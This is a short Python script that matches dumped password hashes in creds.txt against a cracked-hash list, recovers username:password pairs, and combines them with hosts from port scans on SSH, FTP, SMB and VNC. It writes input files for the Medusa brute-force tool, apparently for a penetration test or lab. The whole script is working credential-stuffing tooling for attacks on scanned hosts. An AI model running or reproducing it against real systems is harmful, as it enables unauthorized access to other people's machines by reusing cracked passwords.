import os

cracked = {}
for line in open("hashkiller.txt", "r").readlines():
    if(len(line) < 3): continue
    hashedpw, _, password = line.split()
    hashedpw = hashedpw.strip()
    password = password.strip()
    cracked[hashedpw] = password

results = ""
pairs = []
count = 0
for line in open("creds.txt", "r").readlines():
    if(len(line) < 3): continue
    username, hashedpw = line.split(":")
    username = username.strip()
    hashedpw = hashedpw.strip()
    if hashedpw in cracked:
        count += 1
        password = cracked[hashedpw]
        results += f"{username}:{password}\n"
        pairs += [f"{username}:{password}"]



with open("user-pass2.txt", "w") as f:
    f.write(results)

os.system("sort user-pass2.txt | uniq > user-pass.txt")

print("{0} combinations written to user-pass.txt".format(count))

count = 0
results = ""
for line in open("scans/22_scan.txt", "r").readlines():
    for pair in pairs:
        count += 1
        host = line.strip()
        results += f"{host}:{pair}\n"

with open("medusa-user-pass-22.txt", "w") as f:
    f.write(results)
print("{0} combinations written to medusa-user-pass-22.txt".format(count))

count = 0
results = ""
for line in open("scans/21_scan.txt", "r").readlines():
    for pair in pairs:
        count += 1
        host = line.strip()
        results += f"{host}:{pair}\n"

with open("medusa-user-pass-21.txt", "w") as f:
    f.write(results)
print("{0} combinations written to medusa-user-pass-21.txt".format(count))

count = 0
results = ""
for line in open("scans/445_scan.txt", "r").readlines():
    for pair in pairs:
        count += 1
        host = line.strip()
        results += f"{host}:{pair}\n"

with open("medusa-user-pass-445.txt", "w") as f:
    f.write(results)
print("{0} combinations written to medusa-user-pass-445.txt".format(count))
results = ""
count = 0

for line in open("scans/5900_scan.txt", "r").readlines():
    for pair in pairs:
        count += 1
        host = line.strip()
        results += f"{host}:{pair}\n"

with open("medusa-user-pass-5900.txt", "w") as f:
    f.write(results)
print("{0} combinations written to medusa-user-pass-5900.txt".format(count))
